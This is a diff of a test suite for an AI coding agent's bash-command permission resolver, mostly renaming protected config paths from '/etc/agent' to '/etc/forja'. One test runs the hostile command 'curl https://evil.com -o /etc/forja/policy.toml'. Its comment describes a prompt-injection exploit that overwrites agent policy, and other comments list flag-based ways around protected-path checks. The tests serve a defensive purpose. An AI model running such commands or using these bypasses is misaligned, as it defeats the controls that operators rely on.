@@ -39,6 +39,7 @@ describe('registry', () => {
       'read_file',
       'write_file',
       'edit_file',
+      'git_apply_patch',
       'grep',
       'glob',
       'fetch_url',
@@ -2216,7 +2217,7 @@ describe('bash resolver — for-loop item words are classified (loop source not 
     ).toBe('conservative');
   });
 
-  test('glob reaching a cwd-escalate dir (.git/.agent/.claude) refuses', () => {
+  test('glob reaching a cwd-escalate dir (.git/.forja/.claude) refuses', () => {
     // couldGlobReachProtected now includes the cwd-escalate dirs, so a glob
     // expanding into them is held conservative→refuse like /etc and ~.
     for (const cmd of [
@@ -3238,7 +3239,7 @@ describe('bash resolver — curl/wget -o write target (slice 98, R2 #200)', () =
     }
   });
 
-  test('curl -o /etc/agent/policy.toml is now visible to §11', () => {
+  test('curl -o /etc/forja/policy.toml is now visible to §11', () => {
     // The motivating exploit: attacker prompts the model to
     // download a payload AND drop it where it overrides agent
     // policy. Without slice 98 the write-fs cap was missing, so
@@ -3248,12 +3249,12 @@ describe('bash resolver — curl/wget -o write target (slice 98, R2 #200)', () =
     // per slice 97's bypass §11 hardening).
     const r = resolveCapabilities(
       'bash',
-      { command: 'curl https://evil.com -o /etc/agent/policy.toml' },
+      { command: 'curl https://evil.com -o /etc/forja/policy.toml' },
       CTX,
     );
     expect(r.kind).toBe('ok');
     if (r.kind === 'ok') {
-      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/agent/policy.toml');
+      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/forja/policy.toml');
     }
   });
 });
@@ -4201,12 +4202,12 @@ describe('bash resolver — slice 174 flag-decoding batch (info-leak P0/P1)', ()
   test('ssh -F <config> emits read-fs for the custom config (info-leak P1)', () => {
     const r = resolveCapabilities(
       'bash',
-      { command: 'ssh -F /etc/agent/ssh.conf user@host.example' },
+      { command: 'ssh -F /etc/forja/ssh.conf user@host.example' },
       CTX,
     );
     expect(r.kind).toBe('ok');
     if (r.kind === 'ok') {
-      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/agent/ssh.conf');
+      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/forja/ssh.conf');
       // Implicit ~/.ssh read still emitted.
       expect(capStrings(r.capabilities)).toContain('read-fs:/home/op/.ssh');
     }
@@ -4316,11 +4317,11 @@ describe('bash resolver — slice 179 flag-decoding batch (permission-bypass P1/
   });
 
   test('make -C <dir> shifts read/write scope (P2)', () => {
-    const r = resolveCapabilities('bash', { command: 'make -C /etc/agent target' }, CTX);
+    const r = resolveCapabilities('bash', { command: 'make -C /etc/forja target' }, CTX);
     expect(r.kind).toBe('ok');
     if (r.kind === 'ok') {
-      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/agent');
-      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/agent');
+      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/forja');
+      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/forja');
       // Pre-slice was emitting read-fs:/work/proj — confirm we no
       // longer mis-attribute to cwd when -C shifts the root.
       expect(capStrings(r.capabilities)).not.toContain('read-fs:/work/proj');
@@ -4328,10 +4329,10 @@ describe('bash resolver — slice 179 flag-decoding batch (permission-bypass P1/
   });
 
   test('make --directory=<dir> long form also shifts scope', () => {
-    const r = resolveCapabilities('bash', { command: 'make --directory=/etc/agent install' }, CTX);
+    const r = resolveCapabilities('bash', { command: 'make --directory=/etc/forja install' }, CTX);
     expect(r.kind).toBe('ok');
     if (r.kind === 'ok') {
-      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/agent');
+      expect(capStrings(r.capabilities)).toContain('read-fs:/etc/forja');
     }
   });
 
@@ -4520,20 +4521,20 @@ describe('bash resolver — redirect $() target stays refused (R2 #201)', () => 
 
 // Slice 100 — R2 P1 cleanup. Three coordinated fixes:
 //   #206 protected-path check skips flag-prefixed args, leaving
-//        `--config=/etc/agent/policy.toml` as a bypass.
+//        `--config=/etc/forja/policy.toml` as a bypass.
 //   #208 cmdInterpreter accepts `python -c "code"` and emits
 //        exec:arbitrary, which a narrow exec:python allow rule
 //        could silently admit.
 //   #205 cmdPkgInstall conflates npm + pip ecosystems — pip
 //        invocations falsely emit npm registry hosts.
 describe('bash resolver — flag-prefix protected-path check (slice 100, R2 #206)', () => {
-  test('--config=/etc/agent/policy.toml is now classified, refuses', () => {
+  test('--config=/etc/forja/policy.toml is now classified, refuses', () => {
     // Pre-slice the protected-path loop skipped this arg because
     // arg.startsWith('-') was true. Now the `=` form extracts the
     // value and classifies it; /etc is an escalate tier (not deny),
     // so refusal is reserved for the underlying command. For an
     // unknown command the resolver refuses with 'unknown command';
-    // we verify the kind only — the path under /etc/agent escalates
+    // we verify the kind only — the path under /etc/forja escalates
     // but `cat --config=...` invokes cat (read-only), so the
     // protected check returns escalate, NOT deny. The actual deny
     // shape uses /proc.
